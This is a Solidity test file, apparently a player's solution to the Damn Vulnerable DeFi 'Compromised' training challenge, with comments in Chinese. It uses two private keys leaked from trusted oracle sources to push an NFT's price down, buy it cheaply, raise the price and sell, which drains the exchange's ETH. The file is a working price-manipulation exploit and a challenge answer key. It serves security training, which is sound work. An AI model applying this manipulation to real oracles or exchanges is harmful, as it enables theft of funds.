// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
          // 直接从HTTP响应解码得到的私钥
        // 这些私钥从hex字符串解码得到
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744; // 第一个私钥
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159; // 第二个私钥
        
        address source1 = vm.addr(privateKey1);
        address source2 = vm.addr(privateKey2);
        
        console.log("Source 1 address:", source1);
        console.log("Source 2 address:", source2);
        
        // 验证地址匹配题目中的trusted sources
        assertEq(source1, sources[0], "Source 1 mismatch");
        assertEq(source2, sources[1], "Source 2 mismatch");
        
        // 开始攻击
        
        // 1. 用私钥设置低价
        vm.startBroadcast(privateKey1);
        oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
        vm.stopBroadcast();
        
        vm.startBroadcast(privateKey2);
        oracle.postPrice("DVNFT",PLAYER_INITIAL_ETH_BALANCE);
        vm.stopBroadcast();
        
        // 2. 低价购买
        vm.startPrank(player);
         uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
        vm.stopPrank();
        
        // 3. 恢复原价
        vm.startBroadcast(privateKey1);
        oracle.postPrice("DVNFT", 999.1 ether);
        vm.stopBroadcast();
        
        vm.startBroadcast(privateKey2);
        oracle.postPrice("DVNFT", 999.1 ether);
        vm.stopBroadcast();
        
        // 4. 高价卖出
        vm.startPrank(player);
        nft.approve(address(exchange), tokenId);
        exchange.sellOne(tokenId);
        vm.stopPrank();
        
        // // 5. 再次降低价格到交易所剩余余额
        // uint256 exchangeBalance = address(exchange).balance;
        // vm.startBroadcast(privateKey1);
        // oracle.postPrice("DVNFT", exchangeBalance);
        // vm.stopBroadcast();
        
        // vm.startBroadcast(privateKey2);
        // oracle.postPrice("DVNFT", exchangeBalance);
        // vm.stopBroadcast();
        
        // // 6. 购买剩余NFT
        // vm.startPrank(player);
        // exchange.buyOne{value: exchangeBalance}();
        // vm.stopPrank();
        
        // 7. 恢复价格
        vm.startBroadcast(privateKey1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopBroadcast();
        
        vm.startBroadcast(privateKey2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopBroadcast();
        
        // // 8. 卖出第二个NFT
        // vm.startPrank(player);
        // uint256 tokenId2 = 1;
        // nft.approve(address(exchange), tokenId2);
        // exchange.sellOne(tokenId2);
        // vm.stopPrank();
        
        // 9. 转移资金
        vm.startPrank(player);
        (bool success, ) = recovery.call{value: 999 ether}("");
        require(success, "Transfer failed");
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
